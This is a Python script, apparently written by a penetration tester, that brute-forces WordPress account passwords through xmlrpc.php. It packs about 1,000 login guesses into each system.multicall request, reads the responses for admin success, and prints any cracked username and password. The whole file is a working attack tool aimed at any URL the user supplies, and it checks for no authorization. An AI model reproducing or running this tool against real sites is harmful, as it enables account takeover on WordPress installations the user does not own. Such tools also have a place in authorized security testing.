#!/usr/bin/python3

# Author:   Kavish Gour
# Date:     2019-10-10
# Email: kavishgr@protonmail.com
# Twitter:  https://twitter.com/kavishgour
# Python || SecBSD || Penetration Tester 


#######################################################################################################
#                                         USAGE                                                       #
#######################################################################################################

# USAGE: python3 xmlrpcbruteforce.py http[s]://target.com/xmlrpc.php passwords.txt username     
#        python3 xmlrpcbruteforce.py http[s]://target.com/wordpress/xmlrpc.php passwords.txt username
#        python3 xmlrpcbruteforce.py http[s]://target.com/wp/xmlrpc.php passwords.txt username

#######################################################################################################
#                                         IMPORTS                                                     #
#######################################################################################################

import xml.etree.ElementTree as ET
from xml.sax.saxutils import escape
import requests
import math
import sys
#######################################################################################################
#                                         COLORS                                                      #
#######################################################################################################
class bcolors:
  HEADER    = '\033[95m'
  OKBLUE    = '\033[94m'
  OKGREEN   = '\033[92m'
  WARNING   = '\033[93m'
  FAIL      = '\033[91m'
  ENDC      = '\033[0m'
  BOLD      = '\033[1m'
  UNDERLINE = '\033[4m'
#######################################################################################################
#                                         FUNCTIONS                                                   #
#######################################################################################################

def parse_response(data):
  root = ET.fromstring(data)
  struct_nodes = root.findall(".//struct")
  count = 0

  for struct_node in struct_nodes:
    for members_node in struct_node:
      for member_node in members_node:
        if member_node.text and "isAdmin" in member_node.text:
          return True, count
    count += 1

  return False, count

def send_payload(url, user, passwords):
  prefix = "<?xml version=\"1.0\"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>"
  payload = ""
  suffix = "</data></array></value></param></params></methodCall>"

  for password in passwords:
    payload += "<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name>"
    payload += "<value><array><data><value><array><data><value><string>" + user + "</string></value><value><string>" + escape(password) + "</string></value>"
    payload += "</data></array></value></data></array></value></member></struct></value>"

  data = prefix + payload + suffix 
  headers = {"Content-Type": "application/xml"}
  r = requests.post(url, data=data, headers=headers)
  r.encoding = 'UTF-8'
  #print(r.text)
  return r.text

def main(argv):
  if len(argv) < 3:
    print(bcolors.OKGREEN + "Created by: Kavish Gour\nVersion: 1.0"+ bcolors.ENDC)
    print(bcolors.WARNING + "+ -- --=[Usage: {0} http://wordpress.org/xmlrpc.php passwords.txt username".format(argv[0]) + bcolors.ENDC)
    print(bcolors.WARNING + "+ -- --=[Usage: {0} http://wordpress.org/xmlrpc.php passwords.txt userlist.txt".format(argv[0]) + bcolors.ENDC)
    print(bcolors.WARNING + "Try adding 'www' if nothing works." + bcolors.ENDC)
    sys.exit(0)

  url = argv[1] # SET TARGET
  wordlist = argv[2] # SET CUSTOM WORDLIST
  user = argv[3] # SET CUSTOM USERNAMELIST
  
  print(bcolors.OKBLUE + "" + bcolors.ENDC)
  print(bcolors.OKGREEN + """

                    __     __     __    __     _____       _____      _____      ____                 
                   (_ \   / _)    \ \  / /    (_   _)     (   __ \   (  __ \    / ___)                
                     \ \_/ /      () \/ ()      | |        ) (__) )   ) )_) )  / /                    
                      \   /       / _  _ \      | |       (    __/   (  ___/  ( (                     
                      / _ \      / / \/ \ \     | |   __   ) \ \  _   ) )     ( (                     
                    _/ / \ \_   /_/      \_\  __| |___) ) ( ( \ \_)) ( (       \ \___                 
                   (__/   \__) (/          \) \________/   )_) \__/  /__\       \____)                
                                                                                                          
 ______    ______     __    __   ________    _____      _________     ____     ______       ____    _____  
(_   _ \  (   __ \    ) )  ( (  (___  ___)  / ___/     (_   _____)   / __ \   (   __ \     / ___)  / ___/  
  ) (_) )  ) (__) )  ( (    ) )     ) )    ( (__         ) (___     / /  \ \   ) (__) )   / /     ( (__    
  \   _/  (    __/    ) )  ( (     ( (      ) __)       (   ___)   ( ()  () ) (    __/   ( (       ) __)   
  /  _ \   ) \ \  _  ( (    ) )     ) )    ( (           ) (       ( ()  () )  ) \ \  _  ( (      ( (      
 _) (_) ) ( ( \ \_))  ) \__/ (     ( (      \ \___      (   )       \ \__/ /  ( ( \ \_))  \ \___   \ \___  
(______/   )_) \__/   \______/     /__\      \____\      \_/         \____/    )_) \__/    \____)   \____\ 
                                                                                                           

                  _____   _____  _  _  _ _______  ______ _______ ______       ______  __   __     
                 |_____] |     | |  |  | |______ |_____/ |______ |     \      |_____]   \_/       
                 |       |_____| |__|__| |______ |    \_ |______ |_____/      |_____]    |        
                                                                                  
                              ______  ______  _____  ______  _______ ______                    
                             |______ |______ |       |_____] |______ |     \                   
                             ______| |______ |_____  |_____] ______| |_____/                   
                                                                                  



    """ + bcolors.ENDC)
  print("")
  print("")
  print(bcolors.WARNING + "--=[Brute forcing target: " + url + "]=--" + bcolors.ENDC)

  passwords = []
  iterations = 1 
  count = 0

  print(bcolors.WARNING + "--=[Starting Brute Force Enumeration...]=--" + bcolors.ENDC)

  with open(wordlist, encoding="ISO-8859-1") as f:
    for line in f:
      passwords.append(line.rstrip()) 
      if count == 999:

        response = send_payload(url, user, passwords)
        found, index = parse_response(response)
        if found:
          print(bcolors.OKGREEN + "--=[User found! Success! " + user + "/" + passwords[index] + "]=--" + bcolors.ENDC)
          print(bcolors.OKGREEN + "--=[Brute Force Amplification Attack Successful!]=--" + bcolors.ENDC)
          sys.exit(0)
        else:
          print(bcolors.FAIL + "--=[Tried: " + str(iterations * 1000) + " passwords]=--" + bcolors.ENDC)
        del passwords[:]
        iterations += 1
        count = 0
      count += 1

  if passwords:
    response = send_payload(url, user, passwords)
    found, index = parse_response(response)
    if found:
      print(bcolors.OKGREEN + "--=[User found! Success! " + user + "/" + passwords[index] + "]=--" + bcolors.ENDC)
      print(bcolors.OKGREEN + "--=[Brute Force Amplification Attack Successful!]=--" + bcolors.ENDC)
      sys.exit(0)

  print(bcolors.FAIL + "--=[Brute force failed]=--" + bcolors.ENDC)

main(sys.argv)
